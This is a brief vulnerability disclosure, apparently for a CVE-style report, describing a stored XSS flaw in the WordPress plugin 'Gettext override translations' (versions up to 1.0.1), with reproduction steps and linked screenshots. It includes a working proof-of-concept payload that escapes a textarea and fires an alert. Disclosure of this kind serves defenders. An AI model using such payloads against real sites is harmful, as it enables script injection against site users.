

## Gettext override translations

Cross-Site Scripting (XSS) vulnerability in WP Gettext override translations Plugin <= 1.0.1 at WordPress.

[![vyhGPx.png](https://s1.ax1x.com/2022/08/21/vyhGPx.png)](https://imgse.com/i/vyhGPx)

 - [ ] STEPS:

1.After installing the plugin, click Gettext override translations

[![vyhtxO.png](https://s1.ax1x.com/2022/08/21/vyhtxO.png)](https://imgse.com/i/vyhtxO)

2.put POC in Original(translated) text then save

POC：

    </textarea><img src=1 onerror=alert(/xss/)>

[![vyhcz8.png](https://s1.ax1x.com/2022/08/21/vyhcz8.png)](https://imgse.com/i/vyhcz8)

Then XSS vulnerability triggered

[![vyh2QS.png](https://s1.ax1x.com/2022/08/21/vyh2QS.png)](https://imgse.com/i/vyh2QS)

[![vyh5on.png](https://s1.ax1x.com/2022/08/21/vyh5on.png)](https://imgse.com/i/vyh5on)